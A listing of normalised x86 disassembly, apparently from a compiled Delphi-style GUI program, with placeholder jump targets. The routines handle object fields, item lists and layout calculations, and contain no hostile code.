mov eax [ ebx + 0x26c ]
sub edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0x228 ]
sub [ esi + 0xc ] eax
sub_47c9ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebx eax
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_479c94
test al al
je r-xdata
mov esi [ ebx + 0x210 ]
xor eax eax
mov al [ esi + 0x14 ]
cmp eax 0x4
ja r-xdata
jmp [ eax * 4 + jump_table_47c9ed ]
mov eax [ ebx + 0x210 ]
call sub_479b60
mov eax [ eax + 0xc ]
push eax
mov eax esi
call sub_479b60
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebx + 0x48 ]
sub edx eax
xor ecx ecx
mov eax [ ebx + 0x21c ]
call sub_424dc0
jmp r-xdata
mov eax esi
call sub_479b60
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebx + 0x21c ]
call sub_424dc0
jmp r-xdata
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x210 ]
call sub_479b60
mov ecx [ eax + 0xc ]
mov eax [ ebx + 0x21c ]
pop edx
call sub_42503c
jmp r-xdata
mov eax esi
call sub_479b60
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x210 ]
call sub_479b60
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ebp eax
mov eax ebx
call sub_4489b0
cdq
idiv [ esp + 0x4 ]
test eax eax
jl r-xdata
inc eax
mov [ esp + 0x8 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x8 ]
jne r-xdata
inc esi
xor edi edi
mov eax ebx
call sub_4489f4
cdq
idiv ebp
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebx + 0x210 ]
call sub_479b60
mov eax [ eax + 0xc ]
push eax
mov ecx ebp
imul ecx edi
mov edx [ esp + 0x8 ]
imul edx [ esp + 0x4 ]
mov eax [ ebx + 0x21c ]
call sub_424dc0
inc edi
dec esi
jne r-xdata
sub_47cb18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_449760
cmp [ ebx + 0x224 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov [ edi ] al
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
sub_47cb7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44979c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_47ccd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_47d994
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x6c ]
call sub_47a2bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe4 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ccd8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_479bf4
mov dl 0x1
call sub_479270
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44c078
mov eax [ ebp - 0x4 ]
call sub_44c098
retn
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe8 ]
sub_47cce4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x23a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov [ esp ] eax
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x23c ]
call [ ebx + 0x238 ]
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_47cd20
push ebx
push ecx
mov [ esp ] edx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_47cd44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2 ] dx
mov esi eax
xor eax eax
push ebp
push sub_47cdf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
xor ebx ebx
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
call sub_47d41c
mov edx [ ebp - 0x8 ]
call sub_47a4d4
mov ebx eax
mov eax esi
call sub_47d41c
cmp [ eax + 0x28 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x51 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47b0b8
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x2 ]
call sub_460768
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cdf7
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_47ce00
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47d448
test al al
je r-xdata
mov eax ebx
call sub_44c508
test eax eax
jle r-xdata
mov eax ebx
call sub_47d41c
xor edx edx
call sub_47a4d4
pop ebx
retn
sub_47ce38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_47cec0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x114 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cec7
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x108 ]
lea edx [ ebp - 0xc ]
call sub_448fac
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407f38
test eax eax
jne r-xdata
sub_47ced4
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47d448
test al al
je r-xdata
mov eax ebx
call sub_47d41c
call sub_419538
dec eax
push eax
mov eax ebx
call sub_47d41c
pop edx
call sub_47a4d4
pop ebx
retn
sub_47cf0c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
cmp [ edx + 0x57 ] 0x0
je r-xdata
sub_47cf44
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x140 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov edx [ eax + 0x40 ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
sub_47cf78
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x250 ] 0x1
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x24c ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x250 ]
cdq
idiv ecx
mov edx eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x24c ]
cdq
idiv ecx
mov edx eax
mov eax 0x1
jmp r-xdata
mov ecx edx
imul ecx eax
cmp ecx [ ebp - 0x4 ]
jl r-xdata
mov ecx edx
imul ecx eax
cmp ecx [ ebp - 0x8 ]
jl r-xdata
inc eax
inc eax
sub_47d014
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
push 0x0
mov edx esi
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_44d0c4
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x7fffffff
push ebp
mov eax esi
call sub_47cf78
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44894c
lea eax [ ebp - 0x28 ]
call sub_47cf78
pop ecx
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov edi [ esi ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x40 ]
cmp eax [ esi ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x44 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edi [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44894c
mov eax [ ebp - 0x20 ]
cmp eax [ esi ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44894c
mov eax [ ebp - 0x1c ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44894c
mov edi [ ebp - 0x20 ]
mov eax [ esi ]
sub eax edi
mov edx [ esi ]
sub edx edi
imul edx
mov edx [ esi + 0x4 ]
sub edx [ ebp - 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx [ ebp - 0x10 ]
imul edx ecx
add eax edx
cmp eax [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44894c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov [ ebp - 0x8 ] eax
sub_47d214
push ebx
push esi
mov ebx eax
xor ecx ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov edx [ eax + 0x40 ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
sub_47d24c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
xor edi edi
test esi esi
je r-xdata
test bl bl
je r-xdata
mov eax ebp
call sub_47d448
test al al
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0x140 ]
mov edi eax
test bl bl
je r-xdata
mov eax esi
call sub_4191a8
push eax
mov eax ebp
call sub_47d41c
call sub_419538
dec eax
pop edx
cmp edx eax
jge r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
jle r-xdata
mov eax esi
call sub_4191a8
inc eax
push eax
mov eax ebp
call sub_47d41c
pop edx
call sub_47a4d4
mov edi eax
jmp r-xdata
mov eax ebp
call sub_47d41c
xor edx edx
call sub_47a4d4
mov edi eax
jmp r-xdata
sub_47d2d8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
xor edi edi
test esi esi
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4191a8
test eax eax
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0xec ]
mov edi eax
test bl bl
je r-xdata
mov eax esi
call sub_4191a8
dec eax
push eax
mov eax ebp
call sub_47d41c
pop edx
call sub_47a4d4
mov edi eax
jmp r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
jle r-xdata
mov eax ebp
call sub_47d41c
call sub_419538
dec eax
push eax
mov eax ebp
call sub_47d41c
pop edx
call sub_47a4d4
mov edi eax
jmp r-xdata
sub_47d354
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_47d41c
mov edx esi
call sub_47a4d4
mov eax [ eax + 0x40 ]
pop esi
pop ebx
retn
sub_47d388
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub dl 0x1
jb r-xdata
cmp [ esi + 0x14 ] 0x3
jne r-xdata
je r-xdata
mov eax esi
call sub_479b60
call sub_4273bc
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x4
jne r-xdata
dec dl
je r-xdata
mov eax esi
call sub_479b60
call sub_4273bc
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
jmp r-xdata
mov al [ esi + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
jmp r-xdata
mov eax esi
call sub_479b60
call sub_4273bc
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
sub_47d400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_47d41c
xor edx edx
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
mov eax edx
retn
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov eax ecx
call sub_479bf4
mov edx eax
mov eax ecx
call sub_479b80
mov edx eax
jmp r-xdata
sub_47d448
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ ebx + 0x210 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax edx
call sub_479bb4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x1c ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_419538
test eax eax
jg r-xdata
mov al 0x1
jmp r-xdata
sub_47d48c
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47d448
test al al
je r-xdata
mov eax ebx
call sub_47d41c
call sub_419538
pop ebx
retn
sub_47d4b8
push ebx
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_47d994
pop ebx
retn
mov eax ebx
call sub_47e314
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_47d4f4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_448454
dec bl
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x214 ]
jne r-xdata
cmp edi [ esi + 0x220 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_47d570
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f1c
xor eax eax
push ebp
push sub_47d60e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx ebx
call sub_425300
xor eax eax
push ebp
push sub_47d5eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_447b78
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x11c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d5f2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
xor edx edx
call sub_425300
retn
sub_47d61c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x210 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax esi
mov [ ebx + 0x210 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x24 ]
cmp eax 0x20000000
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
mov eax esi
call sub_479c90
call sub_479044
mov edx eax
mov eax ebx
call sub_47d994
mov [ ebx + 0x210 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax ebx
call sub_44914c
sub_47d698
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi eax
cmp dl [ esi + 0x225 ]
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
retn
mov [ esi + 0x225 ] dl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x210 ] 0x0
je r-xdata
mov eax [ esi + 0x210 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x31 ]
jne r-xdata
mov eax esi
call sub_47d41c
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov dl [ esi + 0x226 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esi + 0x226 ] al
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
jg r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_47dfd0
test al al
jne r-xdata
mov dl 0x1
xor edx edx
jmp r-xdata
mov [ esi + 0x278 ] al
lea ecx [ esp + 0x4 ]
mov edx [ esi + 0x4c ]
mov eax [ esi + 0x48 ]
call sub_417088
mov eax [ esp + 0x4 ]
mov [ esi + 0x25d ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x261 ] eax
mov al 0x1
mov eax esi
call sub_47d41c
call sub_419538
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov al [ esi + 0x227 ]
sub al 0x2
jb r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x128 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
inc ebp
mov [ esp ] 0x0
mov edx [ esi + 0x261 ]
mov eax esi
call sub_448764
jmp r-xdata
sub al 0x2
jb r-xdata
inc [ esp ]
dec ebp
jne r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov edx [ esi + 0x25d ]
mov eax esi
call sub_448740
jmp r-xdata
mov eax esi
call sub_47d41c
mov edx [ esp ]
call sub_47a4d4
mov edi eax
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov al [ edi + 0x30 ]
test al al
jne r-xdata
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax edi
call sub_47b0a8
test eax eax
je r-xdata
mov edx eax
mov eax [ edi + 0x40 ]
call sub_448ecc
mov al [ r-xdata ]
cmp al [ edi + 0x31 ]
je r-xdata
mov dl 0x1
call sub_448ecc
mov dl 0x1
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax edi
call sub_47b0a8
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x210 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x31 ]
jne r-xdata
xor edx edx
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ esi + 0x210 ]
test [ eax + 0x31 ] 0x4
jne r-xdata
mov eax [ esi + 0x210 ]
test [ eax + 0x31 ] 0x2
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
sub_47d8ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp dl [ eax + 0x227 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x227 ] dl
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_47d972
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov edx [ eax ]
call [ edx + 0xdc ]
inc esi
dec ebx
jne r-xdata
sub_47d994
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x214 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x214 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421038
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx ebx
call sub_420e08
sub_47d9e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax ebx
call sub_417088
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_47d014
mov edx eax
mov ecx ebx
mov eax esi
call sub_47c018
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47baa4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_47baa4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ esi + 0x210 ]
call sub_479bf4
mov edx ebx
call sub_419738
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47ba70
push eax
mov eax [ esi + 0x210 ]
call sub_479bf4
mov edx ebx
call sub_47a4d4
pop edx
call sub_47b3d0
mov eax [ ebp - 0xc ]
call sub_4191a8
mov ebx eax
inc ebx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
sub_47da94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax ebx
call sub_417088
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47d014
mov edx eax
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_47c018
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_419738
mov esi eax
mov edx [ edi + 0x48 ]
mov eax esi
call sub_47b4dc
mov eax edi
call sub_47baa4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
